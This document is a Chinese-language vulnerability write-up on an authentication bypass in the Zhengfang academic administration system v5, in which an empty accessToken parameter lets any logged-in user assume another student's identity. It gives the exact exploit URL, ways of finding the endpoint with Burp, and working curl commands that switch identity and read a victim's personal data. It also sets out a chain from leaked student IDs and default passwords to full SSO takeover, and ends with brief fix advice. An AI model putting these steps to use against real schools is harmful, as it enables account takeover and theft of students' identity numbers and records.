# 正方教务认证绕过 (auth_cxVanyIndex)

## 漏洞概述

正方教务系统的 `/auth/auth_cxVanyIndex.html` 接口在 `accessToken` 参数为空时，直接以 `userId` 参数创建会话，导致无需密码即可切换到任意学生身份。

## 漏洞接口

```
GET /jwglxt/auth/auth_cxVanyIndex.html?userId={学号}&role=xs&accessToken=&choice={gnmkdm}
```

| 参数 | 说明 | 示例 |
|------|------|------|
| userId | 目标学号 | 2023212705 |
| role | 角色 | xs (学生) / js (教师) |
| accessToken | **空值** 即可绕过 | (留空) |
| choice | 目标功能模块 | N100801 (个人信息) |

## 发现方法

### 方法1: JS 源码 + 命名枚举

```
1. 从 login.js 中找到 /auth/ 模块引用
   → /auth/auth_cxJwLoginZt.html (登录状态检查)

2. 已知 /auth/ 目录 → 枚举命名变体
   → auth_cxVanyIndex.html (vany = vary any? 任意身份切换)
   → auth_cxLogin.html

3. 浏览器直接访问验证
```

### 方法2: Burp 抓 SSO 跳转链

```
1. 清除登录态 → Chrome 走 Burp 代理
2. 重新登录 → Burp HTTP History 中找包含 accessToken 的 302 跳转
3. 复制 URL 到 Repeater → 置空 accessToken → 换 userId → 验证绕过
```

## 验证步骤

```bash
# 1. 先用自己的账号正常登录（获取 JSESSIONID Cookie）

# 2. 用 auth_cxVanyIndex 切换到任意学号
curl -k -v \
  "https://目标/jwglxt/auth/auth_cxVanyIndex.html?userId=2023212705&role=xs&accessToken=&choice=N100801" \
  -H "Cookie: JSESSIONID=你的JSESSIONID" \
  -L

# 3. 验证身份切换成功 — 访问个人信息页
curl -k "https://目标/jwglxt/xsxxxggl/xsgrxxwh_cxXsgrxx.html?gnmkdm=N100801" \
  -H "Cookie: JSESSIONID=你的JSESSIONID"
# → 返回的是 2023212705 的个人信息
```

## 漏洞链

```
学号泄露 (101K) → auth_cxVanyIndex 绕过 → 查任意学生身份证号
→ CAS 默认密码 (身份证后6位) → 统一认证登录
→ aTrust + ehall + 教务 + 所有 SSO 接入系统 → 完全接管
```

## 影响范围

- 正方教务系统 v5 (zftal-ui-v5)
- 使用 Shiro + CAS 统一认证的版本
- accessToken 参数无空值校验的所有版本

## 修复建议

1. `accessToken` 参数为空时拒绝访问，返回 401
2. 验证 `userId` 与当前会话的一致性
3. 对 `auth_cxVanyIndex` 增加 CSRF Token 校验
